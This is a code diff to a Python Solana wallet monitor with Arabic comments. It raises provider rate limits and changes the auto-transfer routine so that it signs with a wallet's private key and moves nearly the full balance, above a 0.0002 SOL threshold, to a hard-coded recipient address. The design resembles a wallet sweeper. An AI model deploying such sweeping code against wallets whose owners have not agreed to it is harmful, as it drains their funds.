@@ -68,61 +68,61 @@ RPC_PROVIDERS = {
     'RPC_URL': {
         'url': SOLANA_RPC_URL,
         'name': 'RPC_URL (Primary)',
-        'max_requests_per_second': 40,  # زيادة للضعف لتسريع المعالجة
+        'max_requests_per_second': 25,  # معدل موحد 25 طلب/ثانية
         'priority': 1
     },
     'RPC_URL2': {
         'url': SOLANA_RPC_URL2,
         'name': 'RPC_URL2 (Secondary)',
-        'max_requests_per_second': 40,  # زيادة للضعف لتسريع المعالجة
+        'max_requests_per_second': 25,  # معدل موحد 25 طلب/ثانية
         'priority': 1  # نفس الأولوية للتوزيع المتوازن
     },
     'RPC_URL3': {
         'url': SOLANA_RPC_URL3,
         'name': 'RPC_URL3 (QuickNode)',
-        'max_requests_per_second': 15,  # معدل QuickNode
+        'max_requests_per_second': 25,  # معدل موحد 25 طلب/ثانية
         'priority': 1  # نفس الأولوية للتوزيع المتوازن
     },
     'RPC_URL4': {
         'url': os.getenv("RPC_URL4"),
         'name': 'RPC_URL4 (Helius)',
-        'max_requests_per_second': 10,  # معدل Helius
+        'max_requests_per_second': 25,  # معدل موحد 25 طلب/ثانية
         'priority': 1  # نفس الأولوية للتوزيع المتوازن
     },
     'RPC_URL5': {
         'url': os.getenv("RPC_URL5"),
         'name': 'RPC_URL5',
-        'max_requests_per_second': 25,  # مزود إضافي
+        'max_requests_per_second': 25,  # معدل موحد 25 طلب/ثانية
         'priority': 1  # نفس الأولوية للتوزيع المتوازن
     },
     'RPC_URL6': {
         'url': os.getenv("RPC_URL6"),
         'name': 'RPC_URL6',
-        'max_requests_per_second': 25,  # مزود إضافي
+        'max_requests_per_second': 25,  # معدل موحد 25 طلب/ثانية
         'priority': 1  # نفس الأولوية للتوزيع المتوازن
     },
     'RPC_URL7': {
         'url': os.getenv("RPC_URL7"),
         'name': 'RPC_URL7',
-        'max_requests_per_second': 25,  # مزود إضافي
+        'max_requests_per_second': 25,  # معدل موحد 25 طلب/ثانية
         'priority': 1  # نفس الأولوية للتوزيع المتوازن
     },
     'RPC_URL8': {
         'url': os.getenv("RPC_URL8"),
         'name': 'RPC_URL8',
-        'max_requests_per_second': 20,  # مزود إضافي
+        'max_requests_per_second': 25,  # معدل موحد 25 طلب/ثانية
         'priority': 1  # نفس الأولوية للتوزيع المتوازن
     },
     'RPC_URL9': {
         'url': os.getenv("RPC_URL9"),
         'name': 'RPC_URL9',
-        'max_requests_per_second': 20,  # مزود إضافي
+        'max_requests_per_second': 25,  # معدل موحد 25 طلب/ثانية
         'priority': 1  # نفس الأولوية للتوزيع المتوازن
     },
     'RPC_URL10': {
         'url': os.getenv("RPC_URL10"),
         'name': 'RPC_URL10',
-        'max_requests_per_second': 20,  # مزود إضافي
+        'max_requests_per_second': 25,  # معدل موحد 25 طلب/ثانية
         'priority': 1  # نفس الأولوية للتوزيع المتوازن
     }
 }
@@ -147,7 +147,7 @@ SUCCESS_THRESHOLD_FOR_SPEEDUP = 3  # عدد النجاحات المتتالية 
 MIN_NOTIFICATION_AMOUNT = 0.0001  # SOL - حد أدنى أقل لضمان اكتشاف المعاملات الصغيرة
 
 # Auto-transfer configuration
-MIN_AUTO_TRANSFER_AMOUNT = 0.0009  # SOL - الحد الأدنى للتحويل التلقائي
+MIN_AUTO_TRANSFER_AMOUNT = 0.0002  # SOL - الحد الأدنى للتحويل التلقائي
 RECIPIENT_ADDRESS = "FUMnrwov6NuztUmmZZP97587aDZEH4WuKn8bgG6UqjXG"  # عنوان المستلم الافتراضي
 
 # Admin Configuration
@@ -1761,22 +1761,20 @@ class SolanaMonitor:
             from solders.message import Message
             import json
 
-            logger.info(f"🔄 Starting auto-transfer from {truncate_address(from_wallet)} to {truncate_address(to_wallet)}")
+            logger.info(f"🔄 Starting full balance auto-transfer from {truncate_address(from_wallet)} to {truncate_address(to_wallet)}")
 
             # Get current balance
             current_balance = await self.get_wallet_balance(from_wallet)
             logger.info(f"💰 Current balance: {current_balance} SOL")
 
-            min_required_balance = MIN_AUTO_TRANSFER_AMOUNT + 0.001  # Add fee buffer
-            if current_balance < min_required_balance:  # Need at least MIN_AUTO_TRANSFER_AMOUNT SOL plus fees for transfer
-                logger.info(f"💸 Balance too low for transfer: {current_balance} SOL (minimum: {min_required_balance} SOL)")
+            if current_balance < MIN_AUTO_TRANSFER_AMOUNT:  # Need at least MIN_AUTO_TRANSFER_AMOUNT SOL for transfer
+                logger.info(f"💸 Balance too low for transfer: {current_balance} SOL (minimum: {MIN_AUTO_TRANSFER_AMOUNT} SOL)")
                 return False
 
-            # Calculate transfer amount (leave 0.001 SOL for fees)
-            transfer_amount = current_balance - 0.001
-            transfer_lamports = int(transfer_amount * 1_000_000_000)
+            # Calculate full balance transfer (will deduct fees automatically from transferred amount)
+            transfer_lamports = int(current_balance * 1_000_000_000)
 
-            logger.info(f"📤 Transferring {transfer_amount} SOL ({transfer_lamports} lamports)")
+            logger.info(f"📤 Transferring FULL BALANCE {current_balance} SOL ({transfer_lamports} lamports) - fees will be deducted automatically")
 
             # Create keypair from private key
             if private_key.startswith('[') and private_key.endswith(']'):
@@ -1805,12 +1803,24 @@ class SolanaMonitor:
 
             recent_blockhash = blockhash_response['result']['value']['blockhash']
 
-            # Create transfer instruction
+            # Estimate transaction fee first
+            estimated_fee = 5000  # 0.000005 SOL in lamports (typical Solana transaction fee)
+            
+            # Adjust transfer amount to account for fees
+            adjusted_transfer_lamports = max(0, transfer_lamports - estimated_fee)
+            
+            if adjusted_transfer_lamports <= 0:
+                logger.error(f"❌ Balance too low to cover transaction fees: {current_balance} SOL")
+                return False
+
+            logger.info(f"💳 Adjusted transfer amount after fee estimation: {adjusted_transfer_lamports / 1_000_000_000:.9f} SOL")
+
+            # Create transfer instruction with adjusted amount
             transfer_instruction = transfer(
                 TransferParams(
                     from_pubkey=keypair.pubkey(),
                     to_pubkey=destination_pubkey,
-                    lamports=transfer_lamports
+                    lamports=adjusted_transfer_lamports
                 )
             )
 
@@ -1849,12 +1859,14 @@ class SolanaMonitor:
 
             if send_response and 'result' in send_response:
                 tx_signature = send_response['result']
-                logger.info(f"✅ Auto-transfer successful! Signature: {tx_signature}")
-                logger.info(f"📤 Transferred {transfer_amount} SOL from {truncate_address(from_wallet)} to {truncate_address(to_wallet)}")
+                actual_transferred = adjusted_transfer_lamports / 1_000_000_000
+                logger.info(f"✅ Full balance auto-transfer successful! Signature: {tx_signature}")
+                logger.info(f"📤 Transferred {actual_transferred:.9f} SOL (full balance minus fees) from {truncate_address(from_wallet)} to {truncate_address(to_wallet)}")
+                logger.info(f"💰 Original balance: {current_balance} SOL, Transferred: {actual_transferred:.9f} SOL, Remaining: ~0 SOL")
                 return True
             else:
                 error_msg = send_response.get('error', {}).get('message', 'Unknown error') if send_response else 'No response'
-                logger.error(f"❌ Auto-transfer failed: {error_msg}")
+                logger.error(f"❌ Full balance auto-transfer failed: {error_msg}")
                 return False
 
         except Exception as e:
